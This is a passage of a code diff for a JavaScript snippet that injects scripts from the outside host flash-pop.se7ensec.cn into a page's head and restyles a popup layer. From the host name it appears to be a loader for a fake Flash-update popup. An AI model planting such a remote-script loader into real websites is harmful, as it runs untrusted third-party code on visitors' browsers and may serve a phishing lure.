@@ -1,27 +1,19 @@
 var s1 = document.createElement('script');
 s1.setAttribute('type','text/javascript');
 s1.setAttribute('src','//flash-pop.se7ensec.cn/layer/jquery.min.js');
-
-var s2 = document.createElement('script');
-s2.setAttribute('type','text/javascript');
-s2.setAttribute('src','//flash-pop.se7ensec.cn/layer/layer.js');
-
+var head = document.getElementsByTagName('head')[0];
+head.appendChild(s1);
+s1.onload = function(){
+    var s2 = document.createElement('script');
+    s2.setAttribute('type','text/javascript');
+    s2.setAttribute('src','//flash-pop.se7ensec.cn/layer/layer.js');
+    head.appendChild(s2);
+}
 var s3 = document.createElement('link');
 s3.setAttribute('type','text/css');
 s3.setAttribute('rel','stylesheet');
 s3.setAttribute('href','//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css');
-
-var s4 = document.createElement('link');
-s4.setAttribute('type','text/css');
-s4.setAttribute('rel','stylesheet');
-s4.setAttribute('id','layuicss-layer');
-s4.setAttribute('href','//flash-pop.se7ensec.cn/layer/theme/default/layer.css?v=3.1.1');
-
-var head = document.getElementsByTagName('head')[0];
-head.appendChild(s1);
-head.appendChild(s2);
 head.appendChild(s3);
-head.appendChild(s4);
 
         window.onload = () => {
             $(".layui-layer").css("background", "none");
